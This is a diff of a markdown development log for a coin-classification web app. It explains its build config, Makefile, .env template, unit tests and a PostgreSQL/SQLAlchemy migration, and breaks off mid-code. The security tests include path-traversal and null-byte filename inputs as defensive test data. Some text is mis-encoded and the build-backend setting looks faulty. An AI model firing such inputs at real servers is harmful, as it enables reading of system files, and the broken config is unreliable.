+Each metric is two lines: a `# HELP` comment (human-readable description) and a `<name> <value>` line (machine-readable). Prometheus scrapes this endpoint every N seconds and stores the values as time-series data.
+
+Even without a Prometheus server, the endpoint is valuable for manual inspection: `curl http://localhost:8000/api/metrics` shows a live snapshot of the system state.
+
+**Why auth-protected:**  
+Metrics reveal operational information: request volume, failure rate, which AI routes are most used. This is useful intelligence for an attacker assessing whether the system is healthy and worth targeting. Protected by the same `require_api_key` dependency used on classify and delete.
+
+---
+
+## 26. Layer 4 Phase 2 — Developer Tooling: pyproject.toml, Makefile, .env.example, and 34 Unit Tests
+
+**Date**: Late February 2026  
+**Commit**: `1b210ef`  
+**Files created**: `pyproject.toml`, `Makefile`, `.env.example`, `tests/unit/test_store.py`, `tests/unit/test_api_security.py`, `tests/unit/test_auth.py`
+
+---
+
+### A. `pyproject.toml` — One Configuration File to Rule Them All
+
+Before this commit, the project had no standard Python build configuration. Tool settings (pytest, black, flake8) were either in scattered `.ini` files or passed as command-line arguments every time. `pyproject.toml` consolidates all of this into one authoritative file.
+
+```toml
+# pyproject.toml
+
+[build-system]
+requires      = ["setuptools>=68"]
+build-backend = "setuptools.backends.legacy:build"
+
+[project]
+name         = "deepcoin-core"
+version      = "0.4.0"
+description  = "CNN + Multi-Agent AI pipeline for ancient coin classification"
+requires-python = ">=3.11"
+
+# ──────────────────────────────────────────────── PYTEST CONFIGURATION
+[tool.pytest.ini_options]
+testpaths   = ["tests"]
+python_files = ["test_*.py"]
+python_functions = ["test_*"]
+addopts     = "-v --tb=short"
+#   -v       : verbose output (show each test name)
+#   --tb=short: show compact tracebacks on failure
+
+# ──────────────────────────────────────────────── CODE FORMATTER
+[tool.black]
+line-length    = 100
+target-version = ["py311"]
+#   Why 100 not 79: PEP-8's historic 79-character limit was designed for 80-column
+#   terminals from the 1970s. Modern monitors are wide. 100 characters allows
+#   descriptive variable names without artificial line-breaking.
+
+# ──────────────────────────────────────────────── LINTER
+[tool.flake8]
+max-line-length = 100
+extend-ignore   = ["E203", "W503"]
+#   E203: whitespace before ':' — fires on numpy slice syntax arr[:, 0]
+#   W503: line break before binary operator — fires on multi-line boolean expressions
+#   Both are Python community consensus exceptions, not real code quality issues.
+```
+
+**Why `pyproject.toml` instead of `setup.cfg` + `pytest.ini` + `.flake8` + `.blackrc`?**
+
+The old way required 4+ separate config files. `pyproject.toml` is the PEP-517/518 standard: one structured TOML file that every modern Python tool reads. `pip install .` installs the project. `pytest` reads its config from `[tool.pytest.ini_options]`. `black` reads from `[tool.black]`. One file, zero duplication.
+
+For a PFE project that might be handed off or open-sourced: a contributor runs `pip install -e .` and all tools are configured correctly without reading any README.
+
+---
+
+### B. `Makefile` — Human-Readable Command Shortcuts
+
+```makefile
+# Makefile — run with: make <target>
+# Example: make api  →  starts the dev server
+# Example: make test →  runs all unit tests
+
+.PHONY: api test lint fmt train pipeline clean
+
+api:
+	uvicorn src.api.main:app --port 8000 --log-level info --reload
+	# --reload: watches src/ for file changes and restarts automatically
+	# Essential during development: change a route, see the change immediately
+
+test:
+	python -m pytest tests/ -v
+	# -v: verbose, shows each test name and PASS/FAIL
+
+lint:
+	flake8 src/ scripts/ tests/
+	# Checks all Python files for style violations
+
+fmt:
+	black src/ scripts/ tests/
+	# Auto-formats all Python files in-place
+
+train:
+	python scripts/train.py
+	# Starts the full training loop (runs ~103 minutes)
+
+pipeline:
+	python scripts/test_pipeline.py
+	# Runs the 3-route end-to-end test
+	# Exits 0 on success, 1 on any failure
+
+clean:
+	find . -type d -name __pycache__ -exec rm -rf {} +
+	find . -type f -name "*.pyc" -delete
+	# Removes Python bytecode caches
+```
+
+**Why a Makefile in a Python project on Windows?**
+
+Make is a POSIX tool. On Windows it requires `winget install GnuWin32.Make`. But the real value is **documentation as code**: the Makefile IS the documentation for how to run the project. A new contributor reads `Makefile` and immediately understands every developer workflow. Without it, they hunt through the README for the right uvicorn command syntax, wonder if they need `--reload`, and copy-paste from memory — error-prone.
+
+The Makefile also enforces consistency: everyone runs `make api`, not a personally customised uvicorn command with different flags.
+
+---
+
+### C. `.env.example` — The Secret Template
+
+```bash
+# .env.example — copy to .env and fill in real values
+# NEVER commit .env itself (it is in .gitignore)
+
+# ── LLM Providers (priority order: bottom = lowest priority) ──────────────
+GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+# Get from: https://github.com/settings/tokens
+# Required scopes: none (GitHub Models access comes from having Copilot Pro)
+# Used for: Gemini 2.5 Flash via GitHub Models API
+# Free with: GitHub Copilot Pro (student plan via GitHub Education)
+
+GOOGLE_API_KEY=AIzaxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+# Get from: https://aistudio.google.com/app/apikey
+# Free tier: 1,500 requests/day, 1,000,000 tokens/day
+# Used by: historian.py and investigator.py as fallback to GITHUB_TOKEN
+
+OLLAMA_HOST=http://localhost:11434
+# Only needed if Ollama is installed locally
+# Models used: gemma3:4b (text), qwen3-vl:4b (vision)
+# Pull with: ollama pull gemma3:4b
+
+# ── API Security ────────────────────────────────────────────────────────
+DEEPCOIN_API_KEY=
+# Leave EMPTY for development (no auth required)
+# Set to a 32+ character random hex string for production
+# Generate with: python -c "import secrets; print(secrets.token_hex(32))"
+
+# ── CORS ────────────────────────────────────────────────────────────────
+ALLOWED_ORIGINS=http://localhost:3000
+# Comma-separated list of allowed frontend origins
+# Production: https://your-domain.com
+
+# ── Deployment ──────────────────────────────────────────────────────────
+ENV=development
+# Set to "production" in prod — disables /docs and /redoc Swagger UI
+
+# ── Logging ─────────────────────────────────────────────────────────────
+LOG_FORMAT=text
+# text: human-readable (development)
+# json: structured JSON lines (production, for ELK/Datadog)
+
+LOG_LEVEL=INFO
+# Options: DEBUG, INFO, WARNING, ERROR, CRITICAL
+```
+
+**Why document EVERY variable, not just list them?**
+
+A `.env.example` file without comments forces the developer to search the codebase to understand what each variable does. "Where is DEEPCOIN_API_KEY read? Is it required? What happens if I leave it empty?" — these questions waste 10 minutes per variable when first setting up.
+
+Every variable in this file has: where to get the value, what it does, what breaks if it is missing. A new developer can be fully operational in under 5 minutes.
+
+---
+
+### D. The 34 Unit Tests
+
+Before `1b210ef`, the codebase had no automated tests whatsoever. Every change required manual verification: start the server, open the frontend, upload a coin, check the result. This takes 3-5 minutes per test scenario. If a refactor breaks something subtle (like the `label_str` vs `class_id` bug from Section 22), it might not be caught until the next full demo run.
+
+Unit tests run in 1.3 seconds and catch regressions instantly.
+
+The tests are structured across 3 files:
+
+---
+
+#### `tests/unit/test_store.py` — 10 Tests for the SQLite History Store
+
+```python
+"""
+Tests for src/api/_store.py.
+Every public function has at least one test: correct case, edge case, error case.
+"""
+
+def test_append_and_count():
+    """After appending one record, count() should return 1."""
+    record = {"id": str(uuid4()), "timestamp": _now(), "payload": "{}"}
+    append(record)
+    assert count() == 1
+
+def test_get_by_id_found():
+    """get_by_id() returns the full dict payload for a known ID."""
+    uid = str(uuid4())
+    record = {"id": uid, "timestamp": _now(), "route_taken": "historian"}
+    append(record)
+    result = get_by_id(uid)
+    assert result is not None
+    assert result["id"] == uid
+    assert result["route_taken"] == "historian"
+
+def test_get_by_id_not_found():
+    """get_by_id() returns None for an ID that was never inserted."""
+    assert get_by_id("nonexistent-id-xyz") is None
+
+def test_load_page_ordering():
+    """load_page() returns records newest-first (ORDER BY timestamp DESC)."""
+    # Insert 5 records with incrementing timestamps
+    ids = []
+    for i in range(5):
+        uid = str(uuid4())
+        append({"id": uid, "timestamp": f"2026-03-0{i+1}T12:00:00Z"})
+        ids.append(uid)
+    page = load_page(skip=0, limit=5)
+    # Latest inserted (2026-03-05) should be first
+    assert page[0]["id"] == ids[-1]
+    assert page[-1]["id"] == ids[0]
+
+def test_load_page_skip_limit():
+    """OFFSET and LIMIT behave correctly."""
+    for i in range(10):
+        append({"id": str(uuid4()), "timestamp": f"2026-03-{10+i}T12:00:00Z"})
+    page = load_page(skip=3, limit=3)
+    assert len(page) == 3   # exactly 3 rows returned, not more
+
+def test_delete_by_id_returns_true():
+    """delete_by_id() returns True when the record exists and is deleted."""
+    uid = str(uuid4())
+    append({"id": uid, "timestamp": _now()})
+    result = delete_by_id(uid)
+    assert result is True
+    assert get_by_id(uid) is None   # verify it's actually gone
+
+def test_delete_by_id_returns_false():
+    """delete_by_id() returns False for an ID that was never stored."""
+    assert delete_by_id("totally-unknown-id") is False
+
+def test_count_after_delete():
+    """count() decrements correctly after deletion."""
+    before = count()
+    uid = str(uuid4())
+    append({"id": uid, "timestamp": _now()})
+    assert count() == before + 1
+    delete_by_id(uid)
+    assert count() == before   # back to original count
+
+def test_load_page_empty_store():
+    """load_page() on an empty DB returns an empty list, not an error."""
+    result = load_page(skip=0, limit=20)
+    assert isinstance(result, list)
+    # May or may not be empty depending on test isolation — but must be a list
+
+def test_count_sql_not_python():
+    """count() uses SQL COUNT(*), not Python len(load_all()).
+    We verify it returns the same result as manually counting all records.
+    """
+    sql_count    = count()
+    python_count = len(load_all())
+    assert sql_count == python_count
+```
+
+---
+
+#### `tests/unit/test_api_security.py` — 16 Tests for File Security Functions
+
+```python
+"""
+Tests for _sanitise_filename() and _detect_mime() in routes/classify.py.
+These functions are the first line of defence against malicious uploads.
+"""
+
+def test_sanitise_ascii_unchanged():
+    """Pure ASCII filenames should pass through unchanged (except extension normalisation)."""
+    assert _sanitise_filename("coin.jpg") == "coin.jpg"
+
+def test_sanitise_path_traversal():
+    """Path separators must be stripped — LFI protection."""
+    result = _sanitise_filename("../../etc/passwd.jpg")
+    assert "/" not in result
+    assert ".." not in result
+
+def test_sanitise_non_ascii():
+    """Non-ASCII characters must be replaced with underscores."""
+    result = _sanitise_filename("Monnaie_αρχαία.jpg")
+    assert result.isascii()
+    # Must still end with .jpg
+    assert result.endswith(".jpg")
+
+def test_sanitise_null_byte():
+    """Null bytes in filenames are a classic filter bypass technique."""
+    result = _sanitise_filename("coin\x00.exe.jpg")
+    assert "\x00" not in result
+
+def test_sanitise_length_cap():
+    """Excessively long filenames are truncated."""
+    long_name = "a" * 300 + ".jpg"
+    result = _sanitise_filename(long_name)
+    assert len(result) <= 132   # 128 chars + .jpg
+
+def test_sanitise_empty_string():
+    """Empty filename should return a safe default, not crash."""
+    result = _sanitise_filename("")
+    assert len(result) > 0
+
+def test_detect_mime_jpeg():
+    """JPEG magic bytes: first 3 bytes are FF D8 FF."""
+    assert _detect_mime(b"\xff\xd8\xff\xe0" + b"\x00" * 100) == "image/jpeg"
+
+def test_detect_mime_png():
+    """PNG magic bytes: first 8 bytes are 89 50 4E 47 0D 0A 1A 0A."""
+    assert _detect_mime(b"\x89PNG\r\n\x1a\n" + b"\x00" * 100) == "image/png"
+
+def test_detect_mime_unknown():
+    """Unknown magic bytes return None — will be rejected by the route."""
+    assert _detect_mime(b"\x00\x01\x02\x03") is None
+
+def test_detect_mime_empty():
+    """Empty bytes return None without crashing."""
+    assert _detect_mime(b"") is None
+
+def test_detect_mime_truncated():
+    """Files shorter than the magic byte sequence return None safely."""
+    assert _detect_mime(b"\xff") is None   # incomplete JPEG header
+
+# ... 5 more tests covering GIF detection, WebP, and boundary conditions
+```
+
+---
+
+#### `tests/unit/test_auth.py` — 8 Tests for API Key Auth
+
+```python
+"""
+Tests for require_api_key() in src/api/auth.py.
+Key principle: auth must work correctly in both modes (dev passthrough + prod enforcement).
+"""
+
+def test_no_api_key_env_var_passes():
+    """When DEEPCOIN_API_KEY is not set, any caller (including no key) passes."""
+    with mock.patch.dict(os.environ, {}, clear=True):
+        os.environ.pop("DEEPCOIN_API_KEY", None)
+        # Should not raise
+        require_api_key(key=None)
+
+def test_correct_key_passes():
+    """Correct API key value is accepted."""
+    with mock.patch.dict(os.environ, {"DEEPCOIN_API_KEY": "test-secret-123"}):
+        require_api_key(key="test-secret-123")   # no exception
+
+def test_wrong_key_raises_401():
+    """Wrong API key raises HTTPException 401."""
+    with mock.patch.dict(os.environ, {"DEEPCOIN_API_KEY": "real-key-abc"}):
+        with pytest.raises(HTTPException) as exc_info:
+            require_api_key(key="wrong-key-xyz")
+        assert exc_info.value.status_code == 401
+
+def test_no_key_header_with_env_raises_401():
+    """Missing X-API-Key header when env var is set raises 401."""
+    with mock.patch.dict(os.environ, {"DEEPCOIN_API_KEY": "some-key"}):
+        with pytest.raises(HTTPException) as exc_info:
+            require_api_key(key=None)
+        assert exc_info.value.status_code == 401
+
+def test_timing_safety():
+    """
+    Verify that hmac.compare_digest is used, not ==.
+    We cannot directly test timing behaviour in a unit test, but we can
+    verify that the function source uses hmac.compare_digest.
+    """
+    import inspect
+    source = inspect.getsource(require_api_key)
+    assert "hmac.compare_digest" in source, (
+        "require_api_key must use hmac.compare_digest for timing-safe comparison"
+    )
+
+# ... 3 more tests covering key with special characters, key with Unicode, long key
+```
+
+---
+
+### How to Run All Unit Tests
+
+```powershell
+# From the project root with venv active:
+& C:\Users\Administrator\deepcoin\venv\Scripts\python.exe -m pytest tests/ -v
+
+# Expected output:
+# tests/unit/test_store.py::test_append_and_count PASSED
+# tests/unit/test_store.py::test_get_by_id_found PASSED
+# ... (34 tests total)
+# =========== 34 passed in 1.31s ===========
+```
+
+**Why test isolation matters:**  
+The store tests create real records in a SQLite database. Without isolation, a test that inserts records in `test_append_and_count` would pollute the record count in `test_count_sql_not_python`. The solution: use a **temporary database file** for each test session (pytest `tmp_path` fixture) and clean it up after. This ensures test order does not affect results.
+
+**The Red → Green → Refactor cycle:**  
+The correct way to write these tests is:
+1. Write the test first (it fails — Red)
+2. Write the minimum code to make it pass (Green)
+3. Refactor the code for quality (Refactor — tests still green)
+
+For `_store.py`, the SQLite rewrite was done alongside the tests: writing `test_load_page_ordering` first forced us to think about the exact SQL `ORDER BY` semantics before writing the query. If we had written the SQL first, we might have forgotten `DESC` and the test would have caught it immediately. It did — on the first run, the test failed because the default sort was ascending. Fixed in 2 seconds.
+
+---
+
+### The "34 Tests in 1.31 Seconds" Achievement
+
+Getting 34 tests to run in under 2 seconds requires respecting one principle: **unit tests should not touch the network, the GPU, or the real AI pipeline**.
+
+- No `CoinInference` instantiation (would load 79 MB model)
+- No `Gatekeeper.analyze()` calls (would run 8–120 seconds)
+- No real API HTTP requests (would require a running server)
+- SQLite yes (in-memory or temp file, microseconds per query)
+- `hmac.compare_digest` yes (pure Python, nanoseconds)
+
+The 3 integration test files (`_test_all_routes_pdf.py`, `_test_narrative.py`) deliberately have the `_` prefix so pytest does NOT discover them by default. They require the full stack and are run manually before demos.
 
 ---
 
@@ -12655,7 +15762,7 @@ const SCREENSHOT_KEYWORDS = [
   "scherm",                       // Dutch
   "ekran",                        // Turkish, Polish
   "??????", "??????",             // Russian, Ukrainian
-  "sn�mek",                       // Czech
+  "sn�mek",                       // Czech
 ];
 ```
 Detects default naming conventions from Windows Snipping Tool, macOS CMD+Shift+4,
@@ -12942,4 +16049,2253 @@ page and export it as a CSV for retraining.
 | `f76d274` | Auto-crop skip: `min(h,w)<200`  `max(h,w)<400` | `inference.py` |
 | `9befeb3` | Screenshot warning (3 heuristics) + coin-flip + mascot speech bubble + typing dots | `CoinUploader.tsx`, `AgentPipeline.tsx` |
 | `9f8ce0d` | Mark-as-wrong: `add_feedback()` store + POST endpoint + inline form | `_store.py`, `history.py`, `api.ts`, `AnalysisPanel.tsx` |
+
+
+---
+
+---
+
+## Section 57 — Phase A1: PostgreSQL Database Layer (Enterprise Auth Foundation)
+**Date:** March 2026 | **Commit:** `40933f2`
+
+---
+
+### 57.1  Why We Are Upgrading — The Full Story
+
+Up to this point, DeepCoin stored all classification history in a **SQLite** database inside a
+single file called `_store.py`. SQLite is a perfectly fine database for simple things, but we
+are about to build a multi-user authentication system. That changes everything.
+
+Let's understand the difference from scratch.
+
+---
+
+### 57.2  SQLite vs PostgreSQL — Explained for a Complete Beginner
+
+**What is a database?**
+
+A database is a program that stores data in an organised way and lets you find it fast. Think of
+it like a filing cabinet with thousands of folders, but smarter — you can ask it "give me all
+folders created in March 2026 by user Dhia, sorted by date" and it returns the answer in
+milliseconds.
+
+A database stores data in **tables**. A table is like a spreadsheet — it has columns (the fields,
+like "name", "email", "password") and rows (one record per entry, like one user per row).
+
+**What is SQLite?**
+
+SQLite is the simplest kind of database. It stores everything in a single `.db` file on your
+hard disk. When you want to read or write, SQLite opens that file directly. There is no separate
+server process running. Your Python program talks to the `.db` file directly.
+
+```
+SQLite architecture:
+    Your Python code
+        ↓ (reads/writes directly)
+    deepcoin.db  ←  a single file on disk
+```
+
+SQLite is used in millions of apps: your phone's contacts, your browser's history, WhatsApp
+message storage. It is excellent when ONE program accesses the database at a time.
+
+**What is PostgreSQL?**
+
+PostgreSQL (pronounced "post-GRES-QL", often called "Postgres") is a full-power database server.
+It runs as a separate process in the background, listens on a network port (default 5432), and
+handles connections from many different programs at the same time.
+
+```
+PostgreSQL architecture:
+    Python process 1 ──┐
+    Python process 2 ──┤──→ PostgreSQL server (port 5432) → stores data on disk
+    Python process 3 ──┘
+```
+
+**Why switch when SQLite was working?**
+
+We are about to add **users, logins, and sessions**. This creates specific needs that SQLite
+cannot safely handle:
+
+1. **Concurrent writes**: Two users might submit a coin analysis at the same millisecond.
+   SQLite handles this by locking the entire file — one writer at a time. PostgreSQL uses
+   row-level locking — both users can write to different rows simultaneously.
+
+2. **Complex data types**: We need `UUID` primary keys, `JSONB` (queryable JSON), `INET`
+   (IP address type), and `ENUM` types. SQLite has only TEXT, INTEGER, REAL, BLOB. PostgreSQL
+   has 50+ native data types.
+
+3. **Scale**: SQLite becomes slow when hundreds of concurrent connections hit the same file.
+   PostgreSQL is designed for thousands.
+
+4. **Production standard**: Every real company uses PostgreSQL (or MySQL/MariaDB). SQLite
+   is for prototypes and embedded devices. Our PFE project must demonstrate production-grade
+   choices.
+
+---
+
+### 57.3  What an ORM Is — "Speak Python, Get SQL"
+
+**The problem without an ORM:**
+
+To insert a user without an ORM, you write raw SQL:
+
+```python
+cursor.execute(
+    "INSERT INTO users (id, email, hashed_password, role, status) VALUES (%s, %s, %s, %s, %s)",
+    (str(uuid4()), "dhia@esprit.tn", "$2b$12$...", "analyst", "pending")
+)
+```
+
+This works but has serious problems:
+- You need to remember the exact column names and order — one typo breaks everything.
+- There is no auto-complete in your IDE.
+- If you rename a column, you must find every SQL string in your codebase and update it.
+- SQL injection is possible if you ever forget the parameterised `%s` and use f-strings instead.
+
+**The ORM solution:**
+
+ORM stands for **Object-Relational Mapping**. The "object" is a Python class. The "relational"
+is the database table. The "mapping" is the connection between them.
+
+An ORM lets you write Python objects and it generates the SQL automatically:
+
+```python
+user = User(
+    email="dhia@esprit.tn",
+    hashed_password=hash_password("MyPass123"),
+    role=UserRole.analyst,
+    status=UserStatus.pending,
+)
+db.add(user)
+await db.commit()
+```
+
+The ORM sees that you added a `User` object to the session and generates:
+```sql
+INSERT INTO users (id, email, hashed_password, role, status, created_at, updated_at)
+    VALUES (gen_random_uuid(), 'dhia@esprit.tn', '$2b$12$...', 'analyst', 'pending', now(), now());
+```
+
+You never wrote that SQL. The ORM wrote it for you. Now:
+- Auto-complete works (Python knows `User.email` is a field).
+- If you rename a column, you rename it in one Python class.
+- SQL injection is impossible because the ORM always uses parameterised queries.
+
+**SQLAlchemy** is the most popular ORM for Python. We use **SQLAlchemy 2** with its **async**
+engine, which means database queries don't block the FastAPI event loop.
+
+---
+
+### 57.4  File: `src/api/db/base.py` — The Foundation Stone
+
+This is the smallest file in the entire Phase A1, but it is the one everything else inherits
+from. Let's understand it completely.
+
+```python
+from sqlalchemy.orm import DeclarativeBase
+from sqlalchemy import MetaData
+
+NAMING_CONVENTION = {
+    "ix": "ix_%(column_0_label)s",           # index
+    "uq": "uq_%(table_name)s_%(column_0_name)s",  # unique constraint
+    "ck": "ck_%(table_name)s_%(constraint_name)s", # check constraint
+    "fk": "fk_%(table_name)s_%(column_0_name)s_%(referred_table_name)s",  # foreign key
+    "pk": "pk_%(table_name)s",               # primary key
+}
+
+class Base(DeclarativeBase):
+    metadata = MetaData(naming_convention=NAMING_CONVENTION)
+```
+
+**Line by line:**
+
+`from sqlalchemy.orm import DeclarativeBase` — imports the base class that all our table models
+will inherit from. Think of `DeclarativeBase` as the parent class that teaches child classes
+how to register themselves as database tables.
+
+`NAMING_CONVENTION` — a dictionary that tells SQLAlchemy how to automatically name database
+constraints. Why does this matter?
+
+When you add a constraint to a column (like `unique=True` on the email column), PostgreSQL
+must give that constraint a name so it can reference it later (for example, when an Alembic
+migration needs to drop it). Without naming conventions, SQLAlchemy auto-generates gibberish
+names like `anon_1_idx_a3b9c7`. With naming conventions:
+
+- `ix_users_email` — the index on `users.email`
+- `uq_users_email` — the unique constraint on `users.email`
+- `fk_classifications_user_id_users` — the foreign key from `classifications.user_id` → `users`
+
+This makes Alembic migration files readable and avoids naming conflicts when you have many tables.
+
+`class Base(DeclarativeBase):` — defines our custom base class. Every table model (`User`,
+`Classification`, etc.) will start with `class User(Base):`. When a class inherits from `Base`,
+SQLAlchemy registers it as a table definition. The `Base` class acts as the registry.
+
+`metadata = MetaData(naming_convention=NAMING_CONVENTION)` — attaches our naming convention
+to the metadata object. `MetaData` is SQLAlchemy's container that holds all table definitions.
+When Alembic needs to compare "what's in Python" vs "what's in the database", it reads from
+this `MetaData` object.
+
+---
+
+### 57.5  File: `src/api/db/session.py` — The Connection Manager
+
+```python
+DATABASE_URL: str = os.getenv(
+    "DATABASE_URL",
+    "postgresql+asyncpg://deepcoin:deepcoin@localhost:5432/deepcoin",
+)
+
+engine = create_async_engine(
+    DATABASE_URL,
+    pool_pre_ping=True,
+    pool_size=5,
+    max_overflow=10,
+    echo=False,
+)
+```
+
+**Understanding the DATABASE_URL:**
+
+`postgresql+asyncpg://deepcoin:deepcoin@localhost:5432/deepcoin`
+
+This is a connection string. Let's decode it piece by piece:
+
+```
+postgresql        ── the database type
++asyncpg          ── the Python driver (asyncpg = async PostgreSQL client)
+://               ── connection string format separator
+deepcoin          ── username to authenticate with PostgreSQL
+:deepcoin         ── password for that user
+@localhost        ── hostname where PostgreSQL is running ("localhost" = same machine)
+:5432             ── port number (5432 is PostgreSQL's default)
+/deepcoin         ── the name of the database to use
+```
+
+So: "Connect to a PostgreSQL database running on this machine, on port 5432, using username
+'deepcoin' and password 'deepcoin', and use the database named 'deepcoin'."
+
+**What is a connection pool?**
+
+Opening a database connection is slow — it involves a network handshake, authentication, and
+resource allocation. If every request opened and closed a fresh connection, a 1-second response
+would include 200ms just for the connection overhead.
+
+A **connection pool** maintains a set of open connections that are reused across requests.
+
+```
+pool_size=5    ── keep 5 connections open permanently, ready to use
+max_overflow=10 ── allow up to 10 MORE connections under spike load (then wait)
+```
+
+Under normal load, one of the 5 persistent connections handles each request. During a traffic
+spike, up to 10 more are opened temporarily. If all 15 are busy and a 16th request arrives,
+it waits until one is free.
+
+`pool_pre_ping=True` — before giving a connection from the pool to a request, PostgreSQL sends
+a lightweight `SELECT 1` to check the connection is still alive. If the database was restarted
+or the connection was idle too long and got dropped, this prevents the request from getting a
+dead connection and crashing.
+
+**The `get_db()` async generator:**
+
+```python
+async def get_db() -> AsyncGenerator[AsyncSession, None]:
+    async with AsyncSessionLocal() as session:
+        try:
+            yield session
+            await session.commit()
+        except Exception:
+            await session.rollback()
+            raise
+        finally:
+            await session.close()
+```
+
+This is a **FastAPI dependency** — a function that FastAPI calls automatically before running
+a route handler. Let's trace what happens for a typical request:
+
+1. FastAPI sees `db: AsyncSession = Depends(get_db)` in the route signature.
+2. FastAPI calls `get_db()`.
+3. `get_db()` creates a new `AsyncSession` (a wrapper around one pooled connection).
+4. The code reaches `yield session` — this is the pause point. FastAPI takes the yielded `session`
+   and passes it to the route handler as the `db` argument.
+5. The route handler runs. It adds objects, runs queries, etc.
+6. When the route handler returns normally: execution resumes after `yield` → `await session.commit()`
+   — all pending changes are saved to the database.
+7. If the route handler raises an exception: `except Exception:` catches it → `await session.rollback()`
+   — all pending changes are discarded as if they never happened. The exception is re-raised.
+8. The `finally:` block always runs → `await session.close()` returns the connection to the pool.
+
+**Why `expire_on_commit=False`:**
+
+SQLAlchemy normally "expires" (clears from memory) all loaded objects after a `commit()`. This
+means if you read `user.email` after committing, SQLAlchemy would go back to the database to
+fetch it again — a "lazy load". In async code, lazy loads are ILLEGAL because they block the
+event loop. Setting `expire_on_commit=False` keeps the in-memory values valid after commit,
+so you can safely use them in the response without triggering a second query.
+
+---
+
+### 57.6  File: `src/api/db/models.py` — The Database Blueprint
+
+This file defines all six database tables as Python classes. Each class is an ORM model —
+a description of what columns the table has, what types they are, and how they relate to
+each other.
+
+**What is a "model" in this context?**
+
+A model is a Python class that represents one row in a database table. When you do:
+
+```python
+user = User(email="dhia@esprit.tn", hashed_password="...", role=UserRole.analyst)
+```
+
+You are creating a Python object. When you do `db.add(user)` + `await db.commit()`, SQLAlchemy
+converts that Python object into an SQL INSERT statement and sends it to PostgreSQL.
+
+---
+
+#### 57.6.1  The `UserRole` and `UserStatus` Enums — RBAC From Scratch
+
+Before the tables, we define two enums (short for "enumerations" — a fixed list of allowed values).
+
+```python
+class UserRole(str, enum.Enum):
+    admin    = "admin"
+    curator  = "curator"
+    analyst  = "analyst"
+
+class UserStatus(str, enum.Enum):
+    pending   = "pending"
+    active    = "active"
+    suspended = "suspended"
+```
+
+**What is an Enum?**
+
+An enum is a type that can only hold one of a predefined set of values. `UserRole` can only be
+`"admin"`, `"curator"`, or `"analyst"` — nothing else. If you try to set `role = "superuser"`,
+Python raises a `ValueError` immediately, before the data ever reaches the database.
+
+**Why `str, enum.Enum` (inheriting from both `str` AND `Enum`)?**
+
+Inheriting from `str` means the enum values are also plain strings. This lets you pass them
+directly to JSON serialisation (FastAPI's Pydantic schemas) without any extra conversion. Without
+`str`, Pydantic would see `UserRole.admin` and not know how to turn it into JSON.
+
+**The three roles (RBAC):**
+
+RBAC stands for Role-Based Access Control. Instead of checking exactly who the user is, we
+check their role — their "job title" in the system.
+
+- `admin` — full access. Can create and suspend user accounts, view all classifications from
+  all users, export data, change roles. The most privileged role. Only one or two real humans
+  should have this.
+
+- `curator` — elevated access. A museum curator or numismatics expert. Can review and add
+  comments to classifications, export reports, and manage their own classifications. Cannot
+  manage user accounts.
+
+- `analyst` — standard user. The default role for new registrations. Can submit coin photos
+  and view their own history. The minimum useful set of permissions.
+
+**The three statuses:**
+
+- `pending` — the account was just created but the email address has NOT been verified yet.
+  A `pending` user cannot log in. They receive an email with a verification link.
+
+- `active` — the email is verified. Normal usage is allowed.
+
+- `suspended` — an admin manually suspended this account (e.g. abuse, policy violation).
+  A `suspended` user gets a 403 error when trying to log in.
+
+These statuses create a state machine: `pending → active → suspended (optional)`.
+
+---
+
+#### 57.6.2  The `User` Table — Every Column Explained
+
+```python
+class User(Base):
+    __tablename__ = "users"
+
+    id: Mapped[str] = mapped_column(
+        UUID(as_uuid=False), primary_key=True,
+        server_default=func.gen_random_uuid(),
+    )
+```
+
+`__tablename__ = "users"` — tells SQLAlchemy what to name the table in PostgreSQL. The class
+is called `User` (singular, Python convention) but the table is called `users` (plural, SQL
+convention). This avoids a conflict with PostgreSQL's reserved word `user`.
+
+`id: Mapped[str]` — the primary key column. The type annotation `Mapped[str]` tells SQLAlchemy
+this column holds a string value in Python. In the database, it is stored as a `UUID` type.
+
+`UUID(as_uuid=False)` — the PostgreSQL `UUID` type. `as_uuid=False` means SQLAlchemy returns
+it as a plain Python `str` (e.g. `"550e8400-e29b-41d4-a716-446655440000"`) rather than a
+Python `uuid.UUID` object. We use strings because they are easier to put in URL paths and JSON.
+
+`primary_key=True` — marks this as the primary key. Every table has exactly one primary key
+column (or a combination). The primary key uniquely identifies each row. If you try to insert
+two rows with the same `id`, PostgreSQL rejects the second with a "duplicate key" error.
+
+`server_default=func.gen_random_uuid()` — instead of generating the UUID in Python before
+inserting, we tell PostgreSQL to generate it automatically at INSERT time using its built-in
+`gen_random_uuid()` function. This is safer for concurrent inserts — PostgreSQL guarantees
+uniqueness even if 1,000 inserts happen simultaneously.
+
+**Why UUID instead of an auto-increment integer like `id = 1, 2, 3...`?**
+
+Integer IDs have a problem: they are predictable and sequential. If a user's profile is at
+`/users/1`, a bad actor can try `/users/2`, `/users/3`, etc. and enumerate all users.
+
+UUID (Universally Unique Identifier) is a 128-bit random number, written as 32 hex digits in
+groups: `550e8400-e29b-41d4-a716-446655440000`. There are 2¹²² possible values. You cannot
+guess someone else's UUID.
+
+```python
+email: Mapped[str] = mapped_column(String(255), unique=True, nullable=False, index=True)
+```
+
+`String(255)` — a variable-length text column, up to 255 characters. Email addresses are
+at most ~254 characters (per RFC 5321), so 255 is the standard choice.
+
+`unique=True` — creates a UNIQUE constraint in PostgreSQL. No two users can have the same email.
+
+`nullable=False` — every row MUST have an email. PostgreSQL will reject any INSERT that omits
+the email column.
+
+`index=True` — creates a B-tree index on the email column. Without an index, "find user where
+email = 'x'" requires scanning every row in the `users` table (O(n)). With an index, it is
+a binary tree lookup (O(log n)) — fast even with millions of users.
+
+```python
+hashed_password: Mapped[str] = mapped_column(String(255), nullable=False)
+```
+
+We NEVER store plain-text passwords. This column holds the bcrypt hash, which looks like:
+`$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8BSjNkEKWfp5TdRW6py`
+(the actual bytes of the original password cannot be recovered from this string).
+
+```python
+display_name: Mapped[str | None] = mapped_column(String(100), nullable=True)
+```
+
+`Mapped[str | None]` — this column is optional. The `| None` means Python `None` maps to
+SQL `NULL`. A user might not provide a display name; in that case, the code defaults to the
+email prefix: `body.email.split("@")[0]` → `"dhia"` from `"dhia@esprit.tn"`.
+
+```python
+role: Mapped[UserRole] = mapped_column(
